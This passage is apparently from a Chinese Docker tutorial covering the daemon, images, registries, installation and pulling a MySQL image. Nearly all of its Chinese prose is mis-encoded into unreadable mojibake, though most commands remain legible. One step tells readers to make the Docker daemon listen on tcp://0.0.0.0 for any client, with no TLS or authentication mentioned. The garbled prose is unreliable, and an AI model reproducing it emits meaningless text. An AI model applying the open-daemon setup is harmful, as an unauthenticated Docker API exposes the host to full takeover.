ä¸Šï¼Œè´Ÿè´£åˆ›å»ºã€è¿è¡Œã€ç›‘æ§å®¹å™¨ï¼Œæ„å»ºã€å­˜å‚¨é•œåƒã€‚</p><p>è¿è¡Œè¿‡ç¨‹çš„ä½œç”¨æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š</p><ul><li>å‘ Docker Registry è·å–é•œåƒ</li><li>é€šè¿‡ graphdriver æ‰§è¡Œå®¹å™¨é•œåƒçš„æœ¬åœ°åŒ–æ“ä½œ</li><li>é€šè¿‡ networkdriver æ‰§è¡Œå®¹å™¨ç½‘ç»œç¯å¢ƒçš„é…ç½®</li><li>é€šè¿‡ execdriver æ‰§è¡Œå®¹å™¨å†…éƒ¨è¿è¡Œçš„æ‰§è¡Œå·¥ä½œ</li></ul><p>ç”±äº Docker Daemon å’Œ Docker Client çš„å¯åŠ¨éƒ½æ˜¯é€šè¿‡å¯æ‰§è¡Œæ–‡ä»¶ docker æ¥å®Œæˆçš„ï¼Œå› æ­¤ä¸¤è€…çš„å¯åŠ¨æµç¨‹éå¸¸ç›¸ä¼¼ã€‚ Docker å¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶ï¼Œè¿è¡Œä»£ç é€šè¿‡ä¸åŒçš„å‘½ä»¤è¡Œ flag å‚æ•°ï¼ŒåŒºåˆ†ä¸¤è€…ï¼Œå¹¶æœ€ç»ˆè¿è¡Œä¸¤è€…å„è‡ªç›¸åº”çš„éƒ¨åˆ†ã€‚</p><p>å¯åŠ¨ Docker Daemon æ—¶ï¼Œä¸€èˆ¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®Œæˆ</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="attr">--daemon</span> = <span class="literal">true</span></span><br><span class="line">docker â€“d</span><br><span class="line">docker â€“<span class="attr">d</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>å†ç”± docker çš„ main() å‡½æ•°æ¥è§£æä»¥ä¸Šå‘½ä»¤çš„ç›¸åº” flag å‚æ•°ï¼Œå¹¶æœ€ç»ˆå®Œæˆ Docker Daemon çš„å¯åŠ¨ã€‚</p><p>ä¸‹å›¾å¯ä»¥å¾ˆç›´è§‚åœ°çœ‹åˆ° Docker Daemon çš„å¯åŠ¨æµç¨‹ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566368088582.png" alt></p><p>é»˜è®¤é…ç½®ä¸‹ï¼Œ Docker daemon åªèƒ½å“åº”æ¥è‡ªæœ¬åœ° Host çš„å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æœè¦å…è®¸è¿œç¨‹å®¢æˆ·ç«¯è¯·æ±‚ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰“å¼€ TCP ç›‘å¬ã€‚æˆ‘ä»¬å¯ä»¥ç…§ç€å¦‚ä¸‹æ­¥éª¤è¿›è¡Œé…ç½®ï¼š</p><p>1ã€ç¼–è¾‘é…ç½®æ–‡ä»¶ /etc/systemd/system/multi-user.target.wants/docker.service ï¼Œåœ¨ç¯å¢ƒå˜é‡ ExecStart åé¢æ·»åŠ  -H tcp://0.0.0.0ï¼Œå…è®¸æ¥è‡ªä»»æ„ IP çš„å®¢æˆ·ç«¯è¿æ¥ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566368182628.png" alt></p><p>2ã€é‡å¯ Docker daemon</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">daemon-reload</span></span><br><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">restart</span> <span class="selector-tag">docker</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure><p>3ã€æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹å‘½ä»¤å³å¯å®ç°ä¸è¿œç¨‹æœåŠ¡å™¨é€šä¿¡</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> -H æœåŠ¡å™¨<span class="built_in">IP</span>åœ°å€ <span class="meta">info</span></span><br></pre></td></tr></table></figure><p><strong>-H</strong> æ˜¯ç”¨æ¥æŒ‡å®šæœåŠ¡å™¨ä¸»æœºï¼Œ <strong>info</strong> å­å‘½ä»¤ç”¨äºæŸ¥çœ‹ Docker æœåŠ¡å™¨çš„ä¿¡æ¯</p><h3 id="Docker-Image"><a href="#Docker-Image" class="headerlink" title="Docker Image"></a>Docker Image</h3><p>Docker é•œåƒå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æ„å»ºä¹‹åä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚æˆ‘ä»¬å¯å°† Docker é•œåƒçœ‹æˆåªè¯»æ¨¡æ¿ï¼Œé€šè¿‡å®ƒå¯ä»¥åˆ›å»º Docker å®¹å™¨ã€‚</p><p>é•œåƒæœ‰å¤šç§ç”Ÿæˆæ–¹æ³•ï¼š</p><ol><li>ä»æ— åˆ°æœ‰å¼€å§‹åˆ›å»ºé•œåƒ</li><li>ä¸‹è½½å¹¶ä½¿ç”¨åˆ«äººåˆ›å»ºå¥½çš„ç°æˆçš„é•œåƒ</li><li>åœ¨ç°æœ‰é•œåƒä¸Šåˆ›å»ºæ–°çš„é•œåƒ</li></ol><p>æˆ‘ä»¬å¯ä»¥å°†é•œåƒçš„å†…å®¹å’Œåˆ›å»ºæ­¥éª¤æè¿°åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶è¢«ç§°ä½œ <code>Dockerfile</code> ï¼Œé€šè¿‡æ‰§è¡Œ <code>docker build &lt;docker-file&gt;</code> å‘½ä»¤å¯ä»¥æ„å»ºå‡º Docker é•œåƒ,åé¢ä¼šè¯¦ç»†ä»‹ç»è¿™ä¸ªé—®é¢˜</p><h3 id="Docker-Registry-amp-Container"><a href="#Docker-Registry-amp-Container" class="headerlink" title="Docker Registry&amp;Container"></a>Docker Registry&amp;Container</h3><p>å‰é¢åœ¨è®²åŸºæœ¬æ¦‚å¿µçš„æ—¶å€™å®é™…ä¸Šå·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œä¸è¿‡å¤šè§£é‡Š</p><p>Docker registry æ˜¯å­˜å‚¨ docker image çš„ä»“åº“ï¼Œå®ƒåœ¨ docker ç”Ÿæ€ç¯å¢ƒä¸­çš„ä½ç½®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566368568018.png" alt></p><p>è¿è¡Œdocker pushã€docker pullã€docker searchæ—¶ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡ docker daemon ä¸ docker registry é€šä¿¡ã€‚</p><p>Docker å®¹å™¨å°±æ˜¯ Docker é•œåƒçš„è¿è¡Œå®ä¾‹ï¼Œæ˜¯çœŸæ­£è¿è¡Œé¡¹ç›®ç¨‹åºã€æ¶ˆè€—ç³»ç»Ÿèµ„æºã€æä¾›æœåŠ¡çš„åœ°æ–¹ã€‚ Docker Container æä¾›äº†ç³»ç»Ÿç¡¬ä»¶ç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Docker Images è¿™äº›åˆ¶ä½œå¥½çš„ç³»ç»Ÿç›˜ï¼Œå†åŠ ä¸Šæˆ‘ä»¬æ‰€ç¼–å†™å¥½çš„é¡¹ç›®ä»£ç ï¼Œ run ä¸€ä¸‹å°±å¯ä»¥æä¾›æœåŠ¡å•¦ã€‚</p><hr><blockquote><p>Dockerçš„æ¦‚å¿µåŸºæœ¬ä¸Šå·²ç»è®²å®Œï¼Œæœ€åæˆ‘ä»¬è°ˆè°ˆï¼šBuild, Ship, and Runã€‚</p></blockquote><h2 id="æœ€åè°ˆè°ˆ-Build-Ship-and-Run"><a href="#æœ€åè°ˆè°ˆ-Build-Ship-and-Run" class="headerlink" title="æœ€åè°ˆè°ˆ:Build Ship and Run"></a>æœ€åè°ˆè°ˆ:Build Ship and Run</h2><p>å¦‚æœä½ æœç´¢Dockerå®˜ç½‘ï¼Œä¼šå‘ç°å¦‚ä¸‹çš„å­—æ ·ï¼š<strong>â€œDocker - Build, Ship, and Run Any App, Anywhereâ€</strong>ã€‚é‚£ä¹ˆBuild, Ship, and Runåˆ°åº•æ˜¯åœ¨å¹²ä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217325436.jpg" alt="build ship run"></p><ul><li><strong>Buildï¼ˆæ„å»ºé•œåƒï¼‰</strong> ï¼š é•œåƒå°±åƒæ˜¯é›†è£…ç®±åŒ…æ‹¬æ–‡ä»¶ä»¥åŠè¿è¡Œç¯å¢ƒç­‰ç­‰èµ„æºã€‚</li><li><strong>Shipï¼ˆè¿è¾“é•œåƒï¼‰</strong> ï¼šä¸»æœºå’Œä»“åº“é—´è¿è¾“ï¼Œè¿™é‡Œçš„ä»“åº“å°±åƒæ˜¯è¶…çº§ç å¤´ä¸€æ ·ã€‚</li><li><strong>Run ï¼ˆè¿è¡Œé•œåƒï¼‰</strong> ï¼šè¿è¡Œçš„é•œåƒå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå®¹å™¨å°±æ˜¯è¿è¡Œç¨‹åºçš„åœ°æ–¹ã€‚</li></ul><p><strong>Docker è¿è¡Œè¿‡ç¨‹ä¹Ÿå°±æ˜¯å»ä»“åº“æŠŠé•œåƒæ‹‰åˆ°æœ¬åœ°ï¼Œç„¶åç”¨ä¸€æ¡å‘½ä»¤æŠŠé•œåƒè¿è¡Œèµ·æ¥å˜æˆå®¹å™¨ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¹Ÿå¸¸å¸¸å°†Dockerç§°ä¸ºç å¤´å·¥äººæˆ–ç å¤´è£…å¸å·¥ï¼Œè¿™å’ŒDockerçš„ä¸­æ–‡ç¿»è¯‘æ¬è¿å·¥äººå¦‚å‡ºä¸€è¾™ã€‚</strong></p><p><strong>é‚£ä¹ˆDockerç»„ä»¶æ˜¯å¦‚ä½•åä½œè¿è¡Œå®¹å™¨çš„å‘¢ï¼Ÿ</strong></p><p>å®¹å™¨å¯åŠ¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>Docker å®¢æˆ·ç«¯æ‰§è¡Œ docker run å‘½ä»¤</li><li>Docker daemon å‘ç°æœ¬åœ°æ²¡æœ‰ hello-world é•œåƒ</li><li>daemon ä» Docker Hub ä¸‹è½½é•œåƒ</li><li>ä¸‹è½½å®Œæˆï¼Œé•œåƒ hello-world è¢«ä¿å­˜åˆ°æœ¬åœ°</li><li>Docker daemon å¯åŠ¨å®¹å™¨</li></ul><h1 id="Dockerä½¿ç”¨"><a href="#Dockerä½¿ç”¨" class="headerlink" title="Dockerä½¿ç”¨"></a>Dockerä½¿ç”¨</h1><hr><h2 id="Dockerçš„å®‰è£…"><a href="#Dockerçš„å®‰è£…" class="headerlink" title="Dockerçš„å®‰è£…"></a>Dockerçš„å®‰è£…</h2><p>Docker çš„å®‰è£…å’Œä½¿ç”¨æœ‰ä¸€äº›å‰ææ¡ä»¶ï¼Œä¸»è¦ä½“ç°åœ¨ä½“ç³»æ¶æ„å’Œå†…æ ¸çš„æ”¯æŒä¸Šã€‚å¯¹äºä½“ç³»æ¶æ„ï¼Œé™¤äº† Docker ä¸€å¼€å§‹å°±æ”¯æŒçš„ X86-64 ï¼Œå…¶ä»–ä½“ç³»æ¶æ„çš„æ”¯æŒåˆ™ä¸€ç›´åœ¨ä¸æ–­åœ°å®Œå–„å’Œæ¨è¿›ä¸­ã€‚</p><p>Docker åˆ†ä¸º <strong>CE</strong> å’Œ <strong>EE</strong> ä¸¤å¤§ç‰ˆæœ¬ã€‚ CE å³ç¤¾åŒºç‰ˆï¼ˆå…è´¹ï¼Œæ”¯æŒå‘¨æœŸ 7 ä¸ªæœˆï¼‰ï¼Œ EE å³ä¼ä¸šç‰ˆï¼Œå¼ºè°ƒå®‰å…¨ï¼Œä»˜è´¹ä½¿ç”¨ï¼Œæ”¯æŒå‘¨æœŸ 24 ä¸ªæœˆã€‚</p><p>æˆ‘ä»¬åœ¨å®‰è£…å‰å¯ä»¥å‚çœ‹å®˜æ–¹æ–‡æ¡£è·å–æœ€æ–°çš„ Docker æ”¯æŒæƒ…å†µï¼Œå®˜æ–¹æ–‡æ¡£åœ¨è¿™é‡Œï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>docs.docker.com<span class="regexp">/install/</span></span><br></pre></td></tr></table></figure><p>Docker å¯¹äºå†…æ ¸æ”¯æŒçš„åŠŸèƒ½ï¼Œå³å†…æ ¸çš„é…ç½®é€‰é¡¹ä¹Ÿæœ‰ä¸€å®šçš„è¦æ±‚(æ¯”å¦‚å¿…é¡»å¼€å¯ <strong>Cgroup</strong> å’Œ <strong>Namespace</strong> ç›¸å…³é€‰é¡¹ï¼Œä»¥åŠå…¶ä»–çš„ç½‘ç»œå’Œå­˜å‚¨é©±åŠ¨ç­‰)ï¼Œ Docker æºç ä¸­æä¾›äº†ä¸€ä¸ªæ£€æµ‹è„šæœ¬æ¥æ£€æµ‹å’ŒæŒ‡å¯¼å†…æ ¸çš„é…ç½®ï¼Œè„šæœ¬é“¾æ¥åœ¨è¿™é‡Œï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/docker/</span>docker<span class="regexp">/master/</span>contrib<span class="regexp">/check-config.sh</span></span><br></pre></td></tr></table></figure><p>åœ¨æ»¡è¶³å‰ææ¡ä»¶åï¼Œå®‰è£…å°±å˜å¾—éå¸¸çš„ç®€å•äº†ã€‚</p><p>Docker CE çš„å®‰è£…è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š</p><ul><li>MacOSï¼š<a href="https://docs.docker.com/docker-for-mac/install/" target="_blank" rel="noopener">https://docs.docker.com/docker-for-mac/install/</a></li><li>Windowsï¼š<a href="https://docs.docker.com/docker-for-windows/install/" target="_blank" rel="noopener">https://docs.docker.com/docker-for-windows/install/</a></li><li>Ubuntuï¼š<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></li><li>Debianï¼š<a href="https://docs.docker.com/install/linux/docker-ce/debian/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/debian/</a></li><li>CentOSï¼š<a href="https://docs.docker.com/install/linux/docker-ce/centos/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/centos/</a></li><li>Fedoraï¼š<a href="https://docs.docker.com/install/linux/docker-ce/fedora/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/fedora/</a></li><li>å…¶ä»– Linux å‘è¡Œç‰ˆï¼š<a href="https://docs.docker.com/install/linux/docker-ce/binaries/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/binaries/</a></li></ul><p>è¿è¡Œ docker version or docker info éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Î»</span> <span class="string">docker</span> <span class="string">version</span></span><br><span class="line"><span class="attr">Client:</span> <span class="string">Docker</span> <span class="string">Engine</span> <span class="bullet">-</span> <span class="string">Community</span></span><br><span class="line"><span class="attr"> Version:</span>           <span class="number">19.03</span><span class="number">.1</span></span><br><span class="line"> <span class="string">API</span> <span class="attr">version:</span>       <span class="number">1.40</span></span><br><span class="line"> <span class="string">Go</span> <span class="attr">version:</span>        <span class="string">go1.12.5</span></span><br><span class="line"> <span class="string">Git</span> <span class="attr">commit:</span>        <span class="number">74</span><span class="string">b1e89</span></span><br><span class="line"><span class="attr"> Built:</span>             <span class="string">Thu</span> <span class="string">Jul</span> <span class="number">25</span> <span class="number">21</span><span class="string">:17:08</span> <span class="number">2019</span></span><br><span class="line"> <span class="string">OS/Arch:</span>           <span class="string">windows/amd64</span></span><br><span class="line"><span class="attr"> Experimental:</span>      <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸‹è¿˜éœ€æ‰‹åŠ¨ç¡®ä¿å¯ä»¥æ­£å¸¸å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl <span class="built_in">enable</span> docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start docker</span></span><br></pre></td></tr></table></figure><blockquote><p>ç›®å‰dockeråœ¨windowså®¶åº­ç‰ˆä¸­å®‰è£…è¿˜æ¯”è¾ƒå‘ï¼Œä½ éœ€è¦æ‰‹åŠ¨å®‰è£…Hyper-VæœåŠ¡(.cmdæ–‡ä»¶å†…å®¹å¦‚ä¸‹)ï¼Œå¹¶ç»•è¿‡dockerå®‰è£…ç¨‹åºçš„ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹ï¼Œå¦å¤–ï¼Œå®‰è£…æ—¶ä¸è¦å‹¾é€‰ï¼šuse windows containers instead of linux containers</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushd <span class="string">"%~dp0"</span></span><br><span class="line">dir <span class="string">/b</span> %SystemRoot%\servicing\Packages\*Hyper-V*<span class="string">.mum</span> &gt;hyper-v.txt</span><br><span class="line">for <span class="string">/f</span> %%i in <span class="params">('findstr /i . hyper-v.txt 2^&gt;nul')</span> do dism <span class="string">/online</span> <span class="string">/norestart</span> <span class="string">/add-package</span>:<span class="string">"%SystemRoot%\servicing\Packages\%%i"</span></span><br><span class="line">del hyper-v.txt</span><br><span class="line">Dism <span class="string">/online</span> <span class="string">/enable-feature</span> <span class="string">/featurename</span><span class="function">:Microsoft-Hyper-V-All</span> <span class="string">/LimitAccess</span> <span class="string">/ALL</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566326683602.png" alt></p><h2 id="Docker-image"><a href="#Docker-image" class="headerlink" title="Docker-image"></a>Docker-image</h2><blockquote><p>é•œåƒä½œä¸º Docker ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µä¸­ï¼Œæœ€é‡è¦çš„ä¸€ä¸ªå…³é”®è¯ï¼Œå®ƒæœ‰å¾ˆå¤šæ“ä½œï¼Œæ˜¯æ‚¨æƒ³å­¦ä¹ å®¹å™¨æŠ€æœ¯ä¸å¾—ä¸æŒæ¡çš„ã€‚</p></blockquote><h3 id="Docker-ä¸‹è½½é•œåƒ"><a href="#Docker-ä¸‹è½½é•œåƒ" class="headerlink" title="Docker ä¸‹è½½é•œåƒ"></a>Docker ä¸‹è½½é•œåƒ</h3><p>å¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨æœ¬åœ°è¿è¡Œå®¹å™¨ï¼Œå°±å¿…é¡»ä¿è¯æœ¬åœ°å­˜åœ¨å¯¹åº”çš„é•œåƒã€‚æ‰€ä»¥ï¼Œç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½é•œåƒã€‚å½“æˆ‘ä»¬å°è¯•ä¸‹è½½é•œåƒæ—¶ï¼ŒDocker ä¼šå°è¯•å…ˆä»é»˜è®¤çš„é•œåƒä»“åº“ï¼ˆé»˜è®¤ä½¿ç”¨ Docker Hub å…¬å…±ä»“åº“ï¼‰å»ä¸‹è½½ï¼Œå½“ç„¶äº†ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰é…ç½®æƒ³è¦ä¸‹è½½çš„é•œåƒä»“åº“ã€‚</p><p><strong>ä¸‹è½½é•œåƒ</strong></p><p>é•œåƒæ˜¯è¿è¡Œå®¹å™¨çš„å‰æï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>docker pull[IMAGE_NAME]:[TAG]</code>å‘½ä»¤æ¥ä¸‹è½½é•œåƒï¼Œå…¶ä¸­ <code>IMAGE_NAME</code> è¡¨ç¤ºçš„æ˜¯é•œåƒçš„åç§°ï¼Œè€Œ <code>TAG</code> æ˜¯é•œåƒçš„æ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡ â€œ<strong>é•œåƒ + æ ‡ç­¾</strong>â€ çš„æ–¹å¼æ¥ä¸‹è½½é•œåƒã€‚</p><p>å…·ä½“çš„é€‰é¡¹å¯ä»¥é€šè¿‡ docker pull â€“help å‘½ä»¤çœ‹åˆ°ï¼Œè¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹é•œåƒåç§°çš„æ ¼å¼ã€‚</p><ul><li>Docker é•œåƒä»“åº“åœ°å€ï¼šåœ°å€çš„æ ¼å¼ä¸€èˆ¬æ˜¯ &lt;åŸŸå/IP&gt;[:ç«¯å£å·]ã€‚é»˜è®¤åœ°å€æ˜¯ Docker Hubã€‚</li><li>ä»“åº“åï¼šå¦‚ä¹‹å‰æ‰€è¯´ï¼Œè¿™é‡Œçš„ä»“åº“åæ˜¯ä¸¤æ®µå¼åç§°ï¼Œå³ &lt;ç”¨æˆ·å&gt;/&lt;è½¯ä»¶å&gt;ã€‚å¯¹äº Docker Hubï¼Œå¦‚æœä¸ç»™å‡ºç”¨æˆ·åï¼Œåˆ™é»˜è®¤ä¸º libraryï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹é•œåƒã€‚</li></ul><p><strong>æ³¨æ„ï¼š</strong> æ‚¨ä¹Ÿå¯ä»¥ä¸æ˜¾å¼åœ°æŒ‡å®š TAG, å®ƒä¼šé»˜è®¤ä¸‹è½½ latest æ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯ä¸‹è½½ä»“åº“ä¸­æœ€æ–°ç‰ˆæœ¬çš„é•œåƒã€‚è¿™é‡Œå¹¶ä¸æ¨èæ‚¨ä¸‹è½½ latest æ ‡ç­¾ï¼Œå› ä¸ºè¯¥é•œåƒçš„å†…å®¹ä¼šè·Ÿè¸ªé•œåƒçš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶éšä¹‹å˜åŒ–ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸ç¨³å®šçš„ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°è«åå…¶å¦™çš„ bug, æ¨èæ‚¨æœ€å¥½è¿˜æ˜¯æ˜¾ç¤ºçš„æŒ‡å®šå…·ä½“çš„ TAGã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æˆ‘ä»¬æƒ³è¦ä¸‹è½½ä¸€ä¸ª Mysql 5.7 é•œåƒï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤æ¥ä¸‹è½½ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">mysql</span><span class="selector-pseudo">:5.7</span></span><br></pre></td></tr></table></figure><p>ä¼šçœ‹åˆ°æ§åˆ¶å°è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219080097.png" alt></p><p><strong>æ³¨æ„ï¼š</strong> ç”±äºå®˜æ–¹ DockerHub ä»“åº“æœåŠ¡å™¨åœ¨å›½å¤–ï¼Œä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼Œæ‰€ä»¥æˆ‘å°†ä»“åº“çš„åœ°å€æ›´æ”¹æˆäº†å›½å†…çš„ <code>docker.io</code> çš„é•œåƒä»“åº“ï¼Œæ‰€ä»¥åœ¨ä¸Šå›¾ä¸­ï¼Œé•œåƒå‰é¢ä¼šæœ‰ <code>docker.io</code> å‡ºç°ã€‚</p><p>å½“æœ‰ <strong>Downloaded</strong> å­—ç¬¦ä¸²è¾“å‡ºçš„æ—¶å€™ï¼Œè¯´æ˜ä¸‹è½½æˆåŠŸäº†ï¼ï¼</p><p> <strong>éªŒè¯</strong></p><p>è®©æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ï¼Œæœ¬åœ°æ˜¯å¦å­˜åœ¨ Mysql5.7 çš„é•œåƒï¼Œè¿è¡Œå‘½ä»¤ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219176362.png" alt></p><p>å¯ä»¥çœ‹åˆ°æœ¬åœ°çš„ç¡®å­˜åœ¨è¯¥é•œåƒï¼Œç¡®å®æ˜¯ä¸‹è½½æˆåŠŸäº†ï¼</p><p><strong>ä¸‹è½½é•œåƒç›¸å…³ç»†èŠ‚</strong></p><p>å†è¯´è¯´ä¸Šé¢ä¸‹è½½é•œåƒçš„è¿‡ç¨‹ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219262413.png" alt></p><p>é€šè¿‡ä¸‹è½½è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªé•œåƒä¸€èˆ¬æ˜¯ç”±å¤šä¸ªå±‚ï¼ˆ <code>layer</code>ï¼‰ ç»„æˆï¼Œç±»ä¼¼ <code>9fc222b64b0a</code>è¿™æ ·çš„ä¸²è¡¨ç¤ºå±‚çš„å”¯ä¸€ IDï¼ˆå®é™…ä¸Šå®Œæ•´çš„ ID åŒ…æ‹¬äº† 256 ä¸ª bit, 64 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ç»„æˆï¼‰ã€‚</p><p><strong>æ‚¨å¯èƒ½ä¼šæƒ³ï¼Œå¦‚æœå¤šä¸ªä¸åŒçš„é•œåƒä¸­ï¼ŒåŒæ—¶åŒ…å«äº†åŒä¸€ä¸ªå±‚ï¼ˆ layerï¼‰,è¿™æ ·é‡å¤ä¸‹è½½ï¼Œå²‚ä¸æ˜¯å¯¼è‡´äº†å­˜å‚¨ç©ºé—´çš„æµªè´¹ä¹ˆ?</strong></p><p>å®é™…ä¸Šï¼ŒDocker å¹¶ä¸ä¼šè¿™ä¹ˆå‚»ä¼šå»ä¸‹è½½é‡å¤çš„å±‚ï¼ˆ <code>layer</code>ï¼‰,Docker åœ¨ä¸‹è½½ä¹‹å‰ï¼Œä¼šå»æ£€æµ‹æœ¬åœ°æ˜¯å¦ä¼šæœ‰åŒæ · ID çš„å±‚ï¼Œå¦‚æœæœ¬åœ°å·²ç»å­˜åœ¨äº†ï¼Œå°±ç›´æ¥ä½¿ç”¨æœ¬åœ°çš„å°±å¥½äº†ã€‚</p><p><strong>å¦ä¸€ä¸ªé—®é¢˜ï¼Œä¸åŒä»“åº“ä¸­ï¼Œå¯èƒ½ä¹Ÿä¼šå­˜åœ¨é•œåƒé‡åçš„æƒ…å†µå‘ç”Ÿ, è¿™ç§æƒ…å†µå’‹åŠï¼Ÿ</strong></p><p>ä¸¥æ ¼æ„ä¹‰ä¸Šï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>docker pull</code> å‘½ä»¤æ—¶ï¼Œè¿˜éœ€è¦åœ¨é•œåƒå‰é¢æŒ‡å®šä»“åº“åœ°å€( <code>Registry</code>), å¦‚æœä¸æŒ‡å®šï¼Œåˆ™ Docker ä¼šä½¿ç”¨æ‚¨é»˜è®¤é…ç½®çš„ä»“åº“åœ°å€ã€‚ä¾‹å¦‚ä¸Šé¢ï¼Œç”±äºæˆ‘é…ç½®çš„æ˜¯å›½å†… <code>docker.io</code> çš„ä»“åº“åœ°å€ï¼Œæˆ‘åœ¨ <code>pull</code> çš„æ—¶å€™ï¼Œdocker ä¼šé»˜è®¤ä¸ºæˆ‘åŠ ä¸Š <code>docker.io/library</code> çš„å‰ç¼€ã€‚</p><p>å¦‚ï¼šå½“æˆ‘æ‰§è¡Œ <code>docker pull mysql:5.7</code> 